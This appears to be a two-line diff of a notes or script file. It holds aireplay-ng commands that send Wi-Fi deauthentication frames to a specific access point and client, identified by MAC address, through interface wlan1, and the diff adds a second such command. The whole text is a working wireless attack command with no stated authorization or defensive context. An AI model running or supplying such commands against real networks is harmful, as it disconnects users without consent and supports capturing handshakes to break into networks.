@@ -1,1 +1,3 @@
  sudo aireplay-ng -0 10 -a EC:08:6B:A8:70:59 -c 18:83:31:36:FA:49 wlan1
+
+ sudo aireplay-ng -0 20 -a B0:4E:26:B9:55:6C -c AC:5F:3E:FA:8B:BF wlan1
